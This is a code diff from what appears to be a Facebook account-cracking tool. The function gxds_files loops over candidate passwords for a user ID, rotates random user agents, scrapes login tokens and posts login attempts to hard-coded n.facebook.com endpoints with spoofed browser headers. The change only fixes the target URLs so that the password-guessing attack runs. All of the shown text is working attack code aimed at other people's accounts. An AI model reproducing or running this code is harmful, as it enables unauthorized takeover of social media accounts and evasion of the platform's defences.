@@ -1002,7 +1002,7 @@ def gxds_files(uid, pxss):
     try:
         for ps in pxss:
             uuu = random.choice(gxdsUArndm)
-            gxdsfbs = session.get(f"{url}").text
+            gxdsfbs = session.get("https://n.facebook.com").text
             info = {
                 "lsd": re.search('name="lsd" value="(.*?)"', str(gxdsfbs)).group(1),
                 "jazoest": re.search(
@@ -1017,14 +1017,14 @@ def gxds_files(uid, pxss):
                 "login": "Log In",
             }
             update = {
-                "authority": f"{url}",
+                "authority": "https://n.facebook.com",
                 "method": "POST",
                 "scheme": "https",
                 "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8",
                 "accept-encoding": "gzip, deflate, br",
                 "accept-language": "en-US,en;q=1",
                 "cache-control": "no-cache, no-store, must-revalidate",
-                "referer": f"{url}/",
+                "referer": "https://n.facebook.com/",
                 "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
                 "sec-ch-ua-mobile": "?0",
                 "sec-ch-ua-platform": "Windows",
@@ -1039,7 +1039,7 @@ def gxds_files(uid, pxss):
                 "user-agent": uuu,
             }
             session.post(
-                url=f"{url}/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
+                url="https://n.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
                 data=info,
                 headers=update,
             ).text
